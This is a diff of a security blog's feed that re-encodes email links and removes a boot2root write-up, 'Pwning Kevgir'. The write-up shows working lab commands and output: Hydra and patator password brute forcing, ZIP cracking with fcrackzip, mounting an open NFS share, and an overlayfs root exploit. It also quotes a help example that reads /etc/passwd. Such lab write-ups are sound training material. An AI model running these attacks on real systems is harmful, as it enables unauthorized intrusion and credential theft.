-<li>Leon Juranic <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#108;&#101;&#x6f;&#x6e;&#x40;&#x64;&#101;&#102;&#101;&#110;&#x73;&#101;&#99;&#x6f;&#100;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#108;&#x65;&#111;&#x6e;&#x40;&#100;&#x65;&#102;&#101;&#x6e;&#115;&#101;&#x63;&#x6f;&#x64;&#x65;&#46;&#99;&#x6f;&#x6d;</a></li>
+<li>Leon Juranic <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#108;&#x65;&#x6f;&#x6e;&#x40;&#100;&#101;&#102;&#101;&#x6e;&#115;&#101;&#99;&#x6f;&#100;&#101;&#46;&#99;&#111;&#109;">&#x6c;&#101;&#111;&#110;&#x40;&#x64;&#x65;&#102;&#101;&#x6e;&#x73;&#101;&#99;&#111;&#100;&#x65;&#46;&#99;&#111;&#109;</a></li>
 <li>Creation Date: 04/20/2013</li>
 <li>Release Date: 06/25/2014</li>
 </ul>
@@ -2812,7 +3282,7 @@ msf exploit(drupal_drupageddon) > info</p>
 
 <p>Provided by:
   SektionEins
-  Christian Mehlmauer <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x46;&#x69;&#114;&#x65;&#x46;&#x61;&#x72;&#116;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#70;&#x69;&#x72;&#101;&#x46;&#97;&#114;&#116;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a>
+  Christian Mehlmauer <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#70;&#x69;&#114;&#x65;&#70;&#97;&#x72;&#116;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#70;&#x69;&#x72;&#101;&#x46;&#x61;&#114;&#x74;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a>
   Brandon Perry</p>
 
 <p>Available targets:
@@ -2966,11 +3436,11 @@ sh: 0: can&rsquo;t access tty; job control turned off</p>
 
 <h1>cat www-data</h1>
 
-<p>From Dave <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x64;&#x61;&#x76;&#101;&#64;&#x64;&#x72;&#x6f;&#111;&#x70;&#121;&#46;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#46;&#x63;&#x6f;&#109;">&#100;&#x61;&#118;&#x65;&#64;&#100;&#x72;&#111;&#111;&#x70;&#x79;&#46;&#x65;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#x6d;</a> Wed Thu 14 Apr 04:34:39 2016
+<p>From Dave <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x64;&#97;&#x76;&#x65;&#x40;&#100;&#x72;&#111;&#x6f;&#x70;&#x79;&#46;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x64;&#x61;&#118;&#101;&#x40;&#x64;&#x72;&#x6f;&#111;&#x70;&#121;&#x2e;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#109;</a> Wed Thu 14 Apr 04:34:39 2016
 Date: 14 Apr 2016 04:34:39 +0100
-From: Dave <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#100;&#x61;&#118;&#101;&#64;&#x64;&#x72;&#x6f;&#x6f;&#x70;&#121;&#x2e;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;">&#x64;&#x61;&#118;&#101;&#x40;&#100;&#x72;&#111;&#x6f;&#112;&#121;&#x2e;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#101;&#46;&#x63;&#111;&#109;</a>
+From: Dave <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#100;&#x61;&#118;&#101;&#64;&#x64;&#114;&#x6f;&#111;&#112;&#x79;&#46;&#101;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#109;">&#x64;&#x61;&#x76;&#101;&#x40;&#100;&#114;&#111;&#111;&#x70;&#121;&#x2e;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;</a>
 Subject: rockyou with a nice hat!
-Message-ID: <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x37;&#51;&#48;&#50;&#54;&#x32;&#53;&#54;&#x38;&#x40;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">&#55;&#x33;&#48;&#50;&#x36;&#x32;&#53;&#54;&#56;&#x40;&#101;&#120;&#x61;&#109;&#x70;&#108;&#101;&#x2e;&#x63;&#111;&#x6d;</a>
+Message-ID: <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#55;&#x33;&#48;&#x32;&#x36;&#x32;&#x35;&#x36;&#x38;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x37;&#x33;&#x30;&#x32;&#x36;&#x32;&#x35;&#x36;&#x38;&#64;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a>
 X-IMAP: 0080081351 0000002016
 Status: NN</p>
 
@@ -3049,7 +3519,7 @@ SERPENT, TWOFISH.
 truecrack
 TrueCrack v3.0
 Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
-Contact us: <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x69;&#x6e;&#x66;&#x6f;&#116;&#x72;&#x75;&#101;&#x63;&#x72;&#97;&#x63;&#107;&#64;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x69;&#x6e;&#102;&#111;&#116;&#114;&#x75;&#101;&#99;&#114;&#x61;&#x63;&#x6b;&#x40;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>
+Contact us: <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x69;&#110;&#102;&#111;&#116;&#x72;&#x75;&#x65;&#99;&#114;&#97;&#99;&#x6b;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#105;&#x6e;&#x66;&#111;&#116;&#114;&#x75;&#x65;&#x63;&#x72;&#x61;&#x63;&#x6b;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a>
 Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
 Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
 Copyright &copy; 2011 by Luca Vaccaro.</p>
@@ -3152,1021 +3622,6 @@ goes to barrebas and junken for help in testing and final configuration.</p>
 
 <p>/ You will be awarded a medal for        \
 \ disregarding safety in saving someone. /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pwning Kevgir]]></title>
-    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
-    <updated>2017-12-02T14:08:05-05:00</updated>
-    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
-    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>
-
-<!-- more -->
-
-
-<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>
-
-<h2>Port 25 FTP bruteforce with Hydra</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-25/tcp    open  ftp         vsftpd 3.0.2
-|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
-</code></p>
-
-<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>
-
-<p>```
-hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt <a href="ftp://192.168.217.128:25">ftp://192.168.217.128:25</a>
-Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>
-
-<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-12-02 15:08:02
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
-[DATA] attacking <a href="ftp://192.168.217.128:25/">ftp://192.168.217.128:25/</a>
-[25][ftp] host: 192.168.217.128   login: admin   password: admin
-```</p>
-
-<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>
-
-<h2>Port 80 phpmyadmin bruteforce with patator</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Kevgir VM
-</code></p>
-
-<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="&lsquo;port 80&rsquo; &lsquo;port 80 apache&rsquo;" ></p>
-
-<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>
-
-<h3>patator</h3>
-
-<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>
-
-<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>
-
-<p>Let&rsquo;s see the available modules:</p>
-
-<p>```
-Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
-Usage: patator module &mdash;help</p>
-
-<p>Available modules:
-  + ftp_login     : Brute-force FTP
-  + ssh_login     : Brute-force SSH
-  + telnet_login  : Brute-force Telnet
-  + smtp_login    : Brute-force SMTP
-  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
-  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
-  + finger_lookup : Enumerate valid users using Finger
-  + http_fuzz     : Brute-force HTTP
-  + pop_login     : Brute-force POP3
-  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
-  + imap_login    : Brute-force IMAP4
-  + ldap_login    : Brute-force LDAP
-  + smb_login     : Brute-force SMB
-  + smb_lookupsid : Brute-force SMB SID-lookup
-  + rlogin_login  : Brute-force rlogin
-  + vmauthd_login : Brute-force VMware Authentication Daemon
-  + mssql_login   : Brute-force MSSQL
-  + oracle_login  : Brute-force Oracle
-  + mysql_login   : Brute-force MySQL
-  + mysql_query   : Brute-force MySQL queries
-  + pgsql_login   : Brute-force PostgreSQL
-  + vnc_login     : Brute-force VNC
-  + dns_forward   : Forward lookup names
-  + dns_reverse   : Reverse lookup subnets
-  + snmp_login    : Brute-force SNMP v1/2/3
-  + unzip_pass    : Brute-force the password of encrypted ZIP files
-  + keystore_pass : Brute-force the password of Java keystore files
-  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
-  + tcp_fuzz      : Fuzz TCP services
-  + dummy_test    : Testing module
-```</p>
-
-<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>
-
-<p><code>
-cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt
-</code></p>
-
-<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>
-
-<p>```
-patator http_fuzz &mdash;help
-Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
-Usage: http_fuzz &lt;module-options &hellip;> [global-options &hellip;]</p>
-
-<p>Examples:
-  http_fuzz url=<a href="http://10.0.0.1/FILE0">http://10.0.0.1/FILE0</a> 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
-  http_fuzz url=<a href="http://10.0.0.1/manager/html">http://10.0.0.1/manager/html</a> user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
-  http_fuzz url=<a href="http://10.0.0.1/phpmyadmin/index.php">http://10.0.0.1/phpmyadmin/index.php</a> method=POST body=&lsquo;pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en&rsquo; 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep=&lsquo;Cannot log in to the MySQL server&rsquo;</p>
-
-<p>Module options:
-  url           : target url (scheme://host[:port]/path?query)
-  body          : body data
-  header        : use custom headers
-  method        : method to use [GET | POST | HEAD | &hellip;]
-  auto_urlencode: automatically perform URL-encoding [1|0]
-  user_pass     : username and password for HTTP authentication (user:pass)
-  auth_type     : type of HTTP authentication [basic | digest | ntlm]
-  follow        : follow any Location redirect [0|1]
-  max_follow    : redirection limit [5]
-  accept_cookie : save received cookies to issue them in future requests [0|1]
-  http_proxy    : HTTP proxy to use (host:port)
-  ssl_cert      : client SSL certificate file (cert+key in PEM format)
-  timeout_tcp   : seconds to wait for a TCP handshake [10]
-  timeout       : seconds to wait for a HTTP response [20]
-  before_urls   : comma-separated URLs to query before the main request
-  before_egrep  : extract data from the before_urls response to place in the main request
-  after_urls    : comma-separated URLs to query after the main request
-  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
-  persistent    : use persistent connections [1|0]</p>
-
-<p>Global options:
-  &mdash;version            show program&rsquo;s version number and exit
-  -h, &mdash;help           show this help message and exit</p>
-
-<p>  Execution:</p>
-
-<pre><code>-x arg             actions and conditions, see Syntax below
---start=N          start from offset N in the wordlist product
---stop=N           stop at offset N
---resume=r1[,rN]*  resume previous run
--e arg             encode everything between two tags, see Syntax below
--C str             delimiter string in combo files (default is ':')
--X str             delimiter string in conditions (default is ',')
-</code></pre>
-
-<p>  Optimization:</p>
-
-<pre><code>--rate-limit=N     wait N seconds between tests (default is 0)
---max-retries=N    skip payload after N failures (default is 4) (-1 for
-                   unlimited)
--t N, --threads=N  number of threads (default is 10)
-</code></pre>
-
-<p>  Logging:</p>
-
-<pre><code>-l DIR             save output and response data into DIR
--L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
-                   (DIR defaults to '/tmp/patator')
-</code></pre>
-
-<p>  Debugging:</p>
-
-<pre><code>-d, --debug        enable debug messages
-</code></pre>
-
-<p>Syntax:
- -x actions:conditions</p>
-
-<pre><code>actions    := action[,action]*
-action     := "ignore" | "retry" | "free" | "quit" | "reset"
-conditions := condition=value[,condition=value]*
-condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
-
-ignore      : do not report
-retry       : try payload again
-free        : dismiss future similar payloads
-quit        : terminate execution now
-reset       : close current connection in order to reconnect next time
-
-code        : match status code
-size        : match size (N or N-M or N- or -N)
-time        : match time (N or N-M or N- or -N)
-mesg        : match message
-fgrep       : search for string in mesg
-egrep       : search for regex in mesg
-clen        : match Content-Length header (N or N-M or N- or -N)
-</code></pre>
-
-<p>For example, to ignore all redirects to the home page:
-&hellip; -x ignore:code=302,fgrep=&lsquo;Location: /home.html&rsquo;</p>
-
-<p> -e tag:encoding</p>
-
-<pre><code>tag        := any unique string (eg. T@G or _@@_ or ...)
-encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
-
-url         : url encode
-sha1        : hash in sha1
-md5         : hash in md5
-hex         : encode in hexadecimal
-b64         : encode in base64
-</code></pre>
-
-<p>For example, to encode every password in base64:
-&hellip; host=10.0.0.1 user=admin password=<em>@@</em>FILE0<em>@@</em> -e <em>@@</em>:b64</p>
-
-<p>Please read the README inside for more examples and usage information.
-```</p>
-
-<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>
-
-<p><code>
-http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
-</code></p>
-
-<p>And we have the password!</p>
-
-<p><code>
-patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
-17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
-17:17:27 patator    INFO -                                                                              
-17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
-17:17:27 patator    INFO - -----------------------------------------------------------------------------
-17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
-17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
-17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
-</code></p>
-
-<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>
-
-<h2>Cracking ZIP archives</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-111/tcp   open  rpcbind     2-4 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100003  2,3,4       2049/tcp  nfs
-|   100003  2,3,4       2049/udp  nfs
-|   100005  1,2,3      33719/tcp  mountd
-|   100005  1,2,3      41291/udp  mountd
-|   100021  1,3,4      47439/tcp  nlockmgr
-|   100021  1,3,4      60285/udp  nlockmgr
-|   100024  1          57769/udp  status
-|   100024  1          58840/tcp  status
-|   100227  2,3         2049/tcp  nfs_acl
-|_  100227  2,3         2049/udp  nfs_acl
-2049/tcp  open  nfs_acl     2-3 (RPC #100227)
-47439/tcp open  nlockmgr    1-4 (RPC #100021)
-48137/tcp open  mountd      1-3 (RPC #100005)
-58840/tcp open  status      1 (RPC #100024)
-33719/tcp open  mountd      1-3 (RPC #100005)
-43866/tcp open  mountd      1-3 (RPC #100005)
-</code></p>
-
-<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>
-
-<p><code>
-showmount -e 192.168.217.128
-Export list for 192.168.217.128:
-/backup *
-</code></p>
-
-<p>I mounted it on my machine and found an archive:</p>
-
-<p><code>
-root@kali:/mnt# mkdir backup
-root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
-ls -la
-total 12760
-drwxr-xr-x 2 root root     4096 Feb 14  2016 .
-drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
--rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
-</code></p>
-
-<p>When I tried unzipping it, I got prompted for a password:</p>
-
-<p><code>
-unzip backup.tar.bz2.zip
-Archive:  backup.tar.bz2.zip
-[backup.tar.bz2.zip] backup.tar.bz2 password:
-</code></p>
-
-<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>
-
-<p>```
-fcrackzip &mdash;help</p>
-
-<p>fcrackzip version 1.0, a fast/free zip password cracker
-written by Marc Lehmann <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#112;&#99;&#x67;&#64;&#103;&#111;&#x6f;&#x66;&#46;&#x63;&#111;&#x6d;">&#112;&#x63;&#103;&#x40;&#103;&#111;&#111;&#x66;&#46;&#x63;&#x6f;&#x6d;</a> You can find more info on
-<a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>
-
-<p>USAGE: fcrackzip</p>
-
-<pre><code>      [-b|--brute-force]            use brute force algorithm
-      [-D|--dictionary]             use a dictionary
-      [-B|--benchmark]              execute a small benchmark
-      [-c|--charset characterset]   use characters from charset
-      [-h|--help]                   show this message
-      [--version]                   show the version of this program
-      [-V|--validate]               sanity-check the algortihm
-      [-v|--verbose]                be more verbose
-      [-p|--init-password string]   use string as initial password/file
-      [-l|--length min-max]         check password with length min to max
-      [-u|--use-unzip]              use unzip to weed out wrong passwords
-      [-m|--method num]             use method number "num" (see below)
-      [-2|--modulo r/m]             only calculcate 1/m of the password
-      file...                    the zipfiles to crack
-</code></pre>
-
-<p>methods compiled in (* = default):</p>
-
-<p> 0: cpmask
- 1: zip1
-*2: zip2, USE_MULT_TAB
-```</p>
-
-<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>
-
-<p>```
-fcrackzip -b -u -v backup.tar.bz2.zip
-found file &lsquo;backup.tar.bz2&rsquo;, (size cp/uc 13057834/13076586, flags 9, chk 28e3)</p>
-
-<p>PASSWORD FOUND!!!!: pw == aaaaaa
-```</p>
-
-<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>
-
-<p><code>
-ls
-dvwa  gentleman  index.html  web-standards  zenphoto
-</code></p>
-
-<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>
-
-<h2>Samba</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
-Host script results:
-|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-| smb-os-discovery:
-|   OS: Unix (Samba 4.1.6-Ubuntu)
-|   Computer name: canyoupwnme
-|   NetBIOS computer name: CANYOUPWNME\x00
-|   Domain name:
-|   FQDN: canyoupwnme
-|_  System time: 2017-12-02T21:15:36+02:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled but not required
-| smb2-time:
-|   date: 2017-12-02 14:15:37
-|_  start_date: 1600-12-31 19:03:58
-</code></p>
-
-<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>
-
-<h2>SSH &ndash; privilege escalation</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
-|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
-|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
-|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
-</code></p>
-
-<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>
-
-<p><code>
-cat /etc/issue
-Ubuntu 14.04.3 LTS \n \l
-</code></p>
-
-<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>
-
-<p><code>
-admin@canyoupwnme:~$ ./overlayfs
-root@canyoupwnme:~# id
-uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
-root@canyoupwnme:~# whoami
-root
-</code></p>
-
-<h2>Redis</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-6379/tcp  open  redis       Redis key-value store 3.0.7
-</code></p>
-
-<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>
-
-<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
-broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
-hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
-eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
-Sentinel and automatic partitioning with Redis Cluster</p></blockquote>
-
-<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>
-
-<p>```
-redis-cli -h
-redis-cli 4.0.2</p>
-
-<p>Usage: redis-cli [OPTIONS] [cmd [arg [arg &hellip;]]]
-  -h <hostname>      Server hostname (default: 127.0.0.1).
-  -p <port>          Server port (default: 6379).
-  -s <socket>        Server socket (overrides hostname and port).
-  -a <password>      Password to use when connecting to the server.
-  -r <repeat>        Execute specified command N times.
-  -i <interval>      When -r is used, waits <interval> seconds per command.</p>
-
-<pre><code>                 It is possible to specify sub-second times like -i 0.1.
-</code></pre>
-
-<p>  -n <db>            Database number.
-  -x                 Read last argument from STDIN.
-  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
-  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
-  &mdash;raw              Use raw formatting for replies (default when STDOUT is</p>
-
-<pre><code>                 not a tty).
-</code></pre>
-
-<p>  &mdash;no-raw           Force formatted output even when STDOUT is not a tty.
-  &mdash;csv              Output in CSV format.
-  &mdash;stat             Print rolling stats about server: mem, clients, &hellip;
-  &mdash;latency          Enter a special mode continuously sampling latency.</p>
-
-<pre><code>                 If you use this mode in an interactive session it runs
-                 forever displaying real-time stats. Otherwise if --raw or
-                 --csv is specified, or if you redirect the output to a non
-                 TTY, it samples the latency for 1 second (you can use
-                 -i to change the interval), then produces a single output
-                 and exits.
-</code></pre>
-
-<p>  &mdash;latency-history  Like &mdash;latency but tracking latency changes over time.</p>
-
-<pre><code>                 Default time interval is 15 sec. Change it using -i.
-</code></pre>
-
-<p>  &mdash;latency-dist     Shows latency as a spectrum, requires xterm 256 colors.</p>
-
-<pre><code>                 Default time interval is 1 sec. Change it using -i.
-</code></pre>
-
-<p>  &mdash;lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
-  &mdash;slave            Simulate a slave showing commands received from the master.
-  &mdash;rdb <filename>   Transfer an RDB dump from remote server to local file.
-  &mdash;pipe             Transfer raw Redis protocol from stdin to server.
-  &mdash;pipe-timeout <n> In &mdash;pipe mode, abort with error if after sending all data.</p>
-
-<pre><code>                 no reply is received within &lt;n&gt; seconds.
-                 Default timeout: 30. Use 0 to wait forever.
-</code></pre>
-
-<p>  &mdash;bigkeys          Sample Redis keys looking for big keys.
-  &mdash;scan             List all keys using the SCAN command.
-  &mdash;pattern <pat>    Useful with &mdash;scan to specify a SCAN pattern.
-  &mdash;intrinsic-latency <sec> Run a test to measure intrinsic system latency.</p>
-
-<pre><code>                 The test will run for the specified amount of seconds.
-</code></pre>
-
-<p>  &mdash;eval <file>      Send an EVAL command using the Lua script at <file>.
-  &mdash;ldb              Used with &mdash;eval enable the Redis Lua debugger.
-  &mdash;ldb-sync-mode    Like &mdash;ldb but uses the synchronous Lua debugger, in</p>
-
-<pre><code>                 this mode the server is blocked and script changes are
-                 are not rolled back from the server memory.
-</code></pre>
-
-<p>  &mdash;help             Output this help and exit.
-  &mdash;version          Output version and exit.</p>
-
-<p>Examples:
-  cat /etc/passwd | redis-cli -x set mypasswd
-  redis-cli get mypasswd
-  redis-cli -r 100 lpush mylist x
-  redis-cli -r 100 -i 1 info | grep used_memory_human:
-  redis-cli &mdash;eval myscript.lua key1 key2 , arg1 arg2 arg3
-  redis-cli &mdash;scan &mdash;pattern &lsquo;<em>:12345</em>&rsquo;</p>
-
-<p>  (Note: when using &mdash;eval the comma separates KEYS[] from ARGV[] items)</p>
-
-<p>When no command is given, redis-cli starts in interactive mode.
-Type &ldquo;help&rdquo; in interactive mode for information on available commands
-and settings.
-```</p>
-
-<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>
-
-<p>```
-redis-cli -h 192.168.217.128
-192.168.217.128:6379> help
-redis-cli 4.0.2
-To get help about Redis commands type:</p>
-
-<pre><code>  "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
-  "help &lt;command&gt;" for help on &lt;command&gt;
-  "help &lt;tab&gt;" to get a list of possible help topics
-  "quit" to exit
-</code></pre>
-
-<p>To set redis-cli preferences:</p>
-
-<pre><code>  ":set hints" enable online hints
-  ":set nohints" disable online hints
-</code></pre>
-
-<p>Set your preferences in ~/.redisclirc
-192.168.217.128:6379> info</p>
-
-<h1>Server</h1>
-
-<p>redis_version:3.0.7
-redis_git_sha1:00000000
-redis_git_dirty:0
-redis_build_id:aa70bcb321ba8313
-redis_mode:standalone
-os:Linux 3.19.0-25-generic i686
-arch_bits:32
-multiplexing_api:epoll
-gcc_version:4.8.4
-process_id:1263
-run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
-tcp_port:6379
-uptime_in_seconds:3235
-uptime_in_days:0
-hz:10
-lru_clock:2368010
-config_file:/etc/redis/6379.conf</p>
-
-<h1>Clients</h1>
-
-<p>connected_clients:1
-client_longest_output_list:0
-client_biggest_input_buf:0
-blocked_clients:0</p>
-
-<h1>Memory</h1>
-
-<p>used_memory:637624
-used_memory_human:622.68K
-used_memory_rss:8929280
-used_memory_peak:637624
-used_memory_peak_human:622.68K
-used_memory_lua:24576
-mem_fragmentation_ratio:14.00
-mem_allocator:jemalloc-3.6.0</p>
-
-<h1>Persistence</h1>
-
-<p>loading:0
-rdb_changes_since_last_save:0
-rdb_bgsave_in_progress:0
-rdb_last_save_time:1512314215
